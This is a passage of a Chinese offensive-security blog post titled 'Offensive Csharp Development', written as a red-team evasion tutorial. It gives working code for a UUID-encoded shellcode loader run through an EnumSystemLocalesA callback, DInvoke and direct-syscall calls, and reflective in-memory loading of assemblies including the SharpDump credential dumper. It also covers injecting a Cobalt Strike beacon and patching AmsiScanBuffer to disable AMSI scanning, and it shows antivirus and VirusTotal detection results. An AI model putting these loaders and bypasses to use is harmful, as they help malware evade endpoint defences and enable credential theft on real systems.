class="comment">//获得需要写入uuids数组元素个数</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; elems; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//cout &lt;&lt; (RPC_CSTR)uuids[i] &lt;&lt; endl;</span></span><br><span class="line">    <span class="comment">//cout &lt;&lt; (UUID*)hptr &lt;&lt; endl;</span></span><br><span class="line">    RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);<span class="comment">//写入shellcode</span></span><br><span class="line">      <span class="keyword">if</span> (status != RPC_S_OK)<span class="comment">//判断是否写入正常</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"UuidFromeStringA()!=S_OK"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        CloseHandle(ha);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    hptr += <span class="number">16</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//((void(*)())ha)();</span></span><br><span class="line">  EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, <span class="number">0</span>);<span class="comment">//回调函数,运行shellcode</span></span><br><span class="line">  CloseHandle(ha);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先还是我们的api导入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]</span><br><span class="line">static extern IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize,UIntPtr dwMaximumSize);</span><br><span class="line"></span><br><span class="line">[DllImport(&quot;kernel32.dll&quot;, SetLastError = false)]</span><br><span class="line">static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes);</span><br></pre></td></tr></table></figure>
+<p>而UuidFromStringA、EnumSystemLocalesA却无法直接调用，我们可以像上篇文章一样用UnmanagedFunctionPointer的方法来做，不过我们这里要讲的是叫做 DInvoke的方法，即Dynamically invoke arbitrary unmanaged code from managed code without PInvoke.官方地址如下：<br><a href="https://github.com/TheWover/DInvoke，学C#就找TheWover，yyds。里面自带了我们所需的在dll中获取函数的方法：" target="_blank" rel="noopener">https://github.com/TheWover/DInvoke，学C#就找TheWover，yyds。里面自带了我们所需的在dll中获取函数的方法：</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IntPtr prpcrt4 = DInvoke.DynamicInvoke.Generic.GetPebLdrModuleEntry(&quot;rpcrt4.dll&quot;);</span><br><span class="line">IntPtr pUuidFromStringA = DInvoke.DynamicInvoke.Generic.GetExportAddress(prpcrt4, &quot;UuidFromStringA&quot;);</span><br></pre></td></tr></table></figure>
+<p>然后调用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(IntPtr)DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pUuidFromStringA, typeof(DELEGATE.UuidFromStringA), ref uuidFromStringAParam);</span><br></pre></td></tr></table></figure>
+<p>函数的参数一般使用一个object来进行定义</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object[] uuidFromStringAParam = &#123; uuids[i], newHeapAddr &#125;;</span><br></pre></td></tr></table></figure>
+<p>剩下的就是shellcode转uuid，然后把其余代码重写成C#就行啦。最后效果：</p>
+<p><img src="../images/CsharpDV/6.png" alt="image.png"></p>
+<p>我们来看一下免杀效果，C版本的：</p>
+<p><img src="../images/CsharpDV/7.png" alt="image.png"></p>
+<p>C#版本的：</p>
+<p><img src="../images/CsharpDV/8.png" alt="image.png"></p>
+<p>稳过火绒。完整代码地址如下：<a href="https://github.com/lengjibo/OffenSiveCSharp/tree/master/UuidShellcode" target="_blank" rel="noopener">https://github.com/lengjibo/OffenSiveCSharp/tree/master/UuidShellcode</a></p>
+<h2 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h2><p>反射是什么？这里引用百度百科对其的解释：反射指程序可以访问、检测和修改它本身状态或行为的一种能力。</p>
+<p>关于它的基础使用和api调用可以参考MSDN文档：<a href="https://docs.microsoft.com/en-us/dotnet/api/system.reflection?view=netframework-4.5，这里不再赘述。其加载方式主要分为下面三种：" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/dotnet/api/system.reflection?view=netframework-4.5，这里不再赘述。其加载方式主要分为下面三种：</a></p>
+<p>1、Assembly.Load()是从String或AssemblyName类型加载程序集，可以读取字符串形式的程序集，也就是说，文件不需要写入硬盘。</p>
+<p>2、Assembly.LoadFrom()从指定文件中加载程序集，同时会加载目标程序集所引用和依赖的其他程序集。</p>
+<p>例如：<br>Assembly.LoadFrom(“a.dll”)，如果a.dll中引用了b.dll，那么会同时加载a.dll和b.dll。</p>
+<p>3、Assembly.LoadFile()也是从指定文件中加载程序集，但不会加载目标程序集所引用和依赖的其他程序集。</p>
+<p>例如：<br>Assembly.LoadFile(“a.dll”)，如果a.dll中引用了b.dll，那么不会加载b.dll。</p>
+<h3 id="反射使用"><a href="#反射使用" class="headerlink" title="反射使用"></a>反射使用</h3><p>这里以一个小demo来讲解反射的具体用法。</p>
+<p>代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Reflection;</span><br><span class="line"></span><br><span class="line">namespace Basic3</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    class Program </span><br><span class="line">    &#123;</span><br><span class="line">        public static void Main()</span><br><span class="line">        &#123;</span><br><span class="line">            string base64str = &quot;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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==&quot;;</span><br><span class="line">            byte[] buffer = Convert.FromBase64String(base64str);</span><br><span class="line"></span><br><span class="line">            Assembly assembly = Assembly.Load(buffer);</span><br><span class="line"></span><br><span class="line">            Type type = assembly.GetType(&quot;TestApplication.aaa&quot;);</span><br><span class="line"></span><br><span class="line">            MethodInfo method = type.GetMethod(&quot;bbb&quot;);</span><br><span class="line"></span><br><span class="line">            Object obj = assembly.CreateInstance(method.Name);</span><br><span class="line"></span><br><span class="line">            method.Invoke(obj, null);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里采用的是反射加载base64的方式，base64还原后是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line"></span><br><span class="line">namespace TestApplication</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">public class Program</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    public static void Main()</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(&quot;Main&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class aaa</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    public static void bbb()</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.Diagnostics.Process p = new System.Diagnostics.Process();</span><br><span class="line"></span><br><span class="line">        p.StartInfo.FileName = &quot;c:\\windows\\system32\\calc.exe&quot;;</span><br><span class="line"></span><br><span class="line">        p.Start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以一个基本的反射流程如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Assembly.Load获取主文件--&gt;GetType获取命名空间及类--&gt;GetMethod获取方法--&gt;CreateInstance获取信息--&gt;Invoke调用</span><br></pre></td></tr></table></figure>
+<p>最后成功弹出calc</p>
+<p><img src="../images/CsharpDV/9.png" alt="image.png"></p>
+<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>下面将展示使用反射来加载<a href="https://github.com/GhostPack/SharpDump的方法。因为其main函数的问题，我们为其加上一个方法，来方便我们调用，代码如下：" target="_blank" rel="noopener">https://github.com/GhostPack/SharpDump的方法。因为其main函数的问题，我们为其加上一个方法，来方便我们调用，代码如下：</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public static void RunMain()</span><br><span class="line">&#123;</span><br><span class="line">    string systemRoot = Environment.GetEnvironmentVariable(&quot;SystemRoot&quot;);</span><br><span class="line">    string dumpDir = String.Format(&quot;C:\\Windows\\Temp\\&quot;, systemRoot);</span><br><span class="line">    if (!Directory.Exists(dumpDir))</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(String.Format(&quot;\n[X] Dump directory \&quot;&#123;0&#125;\&quot; doesn&apos;t exist!\n&quot;, dumpDir));</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Minidump();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后我们这里选择远程加载+base64的方法。先对程序进行编码：</p>
+<p><img src="../images/CsharpDV/10.png" alt="image.png"></p>
+<p>然后编写加载程序。代码已传至github</p>
+<p>效果如下：</p>
+<p><img src="../images/CsharpDV/11.png" alt="image.png"></p>
+<p>VT查杀：</p>
+<p><img src="../images/CsharpDV/12.png" alt="image.png"></p>
+<h2 id="Part4"><a href="#Part4" class="headerlink" title="Part4"></a>Part4</h2><p>首先我们要理解系统调用的概念。在Windows中，进程的体系结构分为两种处理器访问模式——用户模式(user mode)和内核模式(kernel mode)。 这两种模式是为了保护用户应用程序免于访问和修改任何重要的系统数据。 用户应用程序（例如Chrome，Word等）均在用户模式下运行，而系统代码（例如系统服务和设备驱动程序）均在内核模式下运行。如图：</p>
+<p><img src="../images/CsharpDV/13.png" alt="image.png"></p>
+<p>在内核模式下，处理器允许程序访问所有系统内存以及所有CPU指令。有一些x86和x64的处理器也使用ring levels这样的术语来区分这两种模式。</p>
+<p>使用ring level特权模式的处理器定义了四个特权级别（rings）来保护系统代码和数据。下图是一个ring levels的示例。</p>
+<p><img src="../images/CsharpDV/14.png" alt="image.png"></p>
+<p>Windows只使用其中的两个级别：Ring0表示内核模式，Ring3表示用户模式。在处理器正常运行期间，处理器会根据其上运行的代码类型在这两种模式之间进行切换。为了让用户应用程序能够在内核模式下访问这些数据结构，进程使用了一个特殊的处理器指令触发器，叫做“ syscall”。该指令触发了处理器访问模式的转换，并允许处理器访问内核中的系统服务调用代码。我们使用windbg来查看该过程。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x ntdll!NtFlushInstructionCache</span><br><span class="line">u 00007ffb`f7f3e330</span><br></pre></td></tr></table></figure>
+<p><img src="../images/CsharpDV/15.png" alt="image.png"></p>
+<p>此时我们便看到了整个过程以及其对应的汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov  r10,rcx</span><br><span class="line">mov  eax,0E3h</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>那么0E3h就是函数NtFlushInstructionCache的系统调用号，其完整列表可以参考：<a href="https://j00ru.vexillium.org/syscalls/nt/64/" target="_blank" rel="noopener">https://j00ru.vexillium.org/syscalls/nt/64/</a> 而D / Invoke有一个出色的方法GetSyscallStub，该方法可以在ntdll中找到给定API的syscall方法。</p>
+<p>以NtFlushInstructionCache为例，我们需要先来定义它的委托。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[UnmanagedFunctionPointer(CallingConvention.StdCall)]</span><br><span class="line">delegate NTSTATUS NtFlushInstructionCache(</span><br><span class="line">    Process processHandle,</span><br><span class="line">    IntPtr address, </span><br><span class="line">    int bytes</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>结构体NTSTATUS可以在<a href="https://www.pinvoke.net/default.aspx/Enums/NtStatus.html找到,然后就是获取函数的问题了：" target="_blank" rel="noopener">https://www.pinvoke.net/default.aspx/Enums/NtStatus.html找到,然后就是获取函数的问题了：</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IntPtr stub = Generic.GetSyscallStub(&quot;NtFlushInstructionCache&quot;);</span><br><span class="line">NtFlushInstructionCache NtFlushInstructionCaches = (NtFlushInstructionCache)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtFlushInstructionCache));</span><br></pre></td></tr></table></figure>
+<p>调用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var processHandle = Process.GetProcessById(1796);</span><br><span class="line">var status = NtFlushInstructionCaches(processHandle, IntPtr.Zero, 0);</span><br><span class="line">Console.WriteLine(status);</span><br></pre></td></tr></table></figure>
+<p>最后的效果：</p>
+<p><img src="../images/CsharpDV/16.png" alt="image.png"></p>
+<p>那么我们也可以用它来上线我们的CobaltStrike。即：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OpenProcess / VirtualAllocEx / WriteProcessMemory / CreateRemoteThread</span><br></pre></td></tr></table></figure>
+<p><img src="../images/CsharpDV/17.png" alt="image.png"></p>
+<p>且可以看到一个未使用ntdll的线程</p>
+<p><img src="../images/CsharpDV/18.png" alt="image.png"></p>
+<h2 id="Part5"><a href="#Part5" class="headerlink" title="Part5"></a>Part5</h2><p>首先我们先来看一下什么是amsi。</p>
+<p>AMSI的全称是反恶意软件扫描接口（Anti-Malware Scan Interface），是从Windows 10开始引入的一种机制。AMSI是应用程序和服务能够使用的一种接口，程序和服务可以将“数据”发送到安装在系统上的反恶意软件服务（如Windows Defender）。</p>
+<p>服务和应用程序可以通过AMSI来与系统中已安装的反恶意软件通信。</p>
+<p>AMSI为终端安全供应商提供了丰富的接口以帮助他们更好地对目标组件进行内存缓冲区安全扫描，或选择需要扫描的内容。根据微软提供的信息，AMSI支持的组件有如下几种：</p>
+<ul>
+<li>1、用户账户控制（UAC）</li>
+<li>2、PowerShell（脚本、交互使用和动态代码计算）</li>
+<li>3、Windows脚本主机（wscript.exe和cscript.exe）</li>
+<li>4、JavaScript和VBScript</li>
+<li>5、Office VBA宏</li>
+</ul>
+<p>AMSI的整体架构如下：</p>
+<p><img src="../images/CsharpDV/amsi7archi.jpeg" alt="image.png"></p>
+<p>剩下的就是来编写代码了。</p>
+<p>patch前后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">amsi!AmsiScanBuffer:</span><br><span class="line">00007ffb`dd183310 4c8bdc          mov     r11,rsp</span><br><span class="line">00007ffb`dd183313 49895b08        mov     qword ptr [r11+8],rbx</span><br><span class="line">00007ffb`dd183317 49896b10        mov     qword ptr [r11+10h],rbp</span><br><span class="line">00007ffb`dd18331b 49897318        mov     qword ptr [r11+18h],rsi</span><br><span class="line"></span><br><span class="line">amsi!AmsiScanBuffer:</span><br><span class="line">00007ffb`dd183310 b857000780      mov     eax,80070057h</span><br><span class="line">00007ffb`dd183315 c3              ret</span><br><span class="line">00007ffb`dd183316 084989          or      byte ptr [rcx-77h],cl</span><br><span class="line">00007ffb`dd183319 6b1049          imul    edx,dword ptr [rax],49h</span><br><span class="line">00007ffb`dd18331c 897318          mov     dword ptr [rbx+18h],esi</span><br></pre></td></tr></table></figure>
+<p>效果：</p>
+<p><img src="../images/CsharpDV/19.png" alt="image.png"></p>
+<p>之后</p>
+<p><img src="../images/CsharpDV/20.png" alt="image.png"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/CsharpDV/">Offensive Csharp Development</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2021年03月29日 - 21:03</p>
+  <p><span>最后更新:</span>2021年03月29日 - 21:03</p>
+  <p><span>原始链接:</span><a href="/CsharpDV/" title="Offensive Csharp Development">https://lengjibo.github.io/CsharpDV/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/CsharpDV/"  aria-label="复制成功！"></i></span>
+  </p>
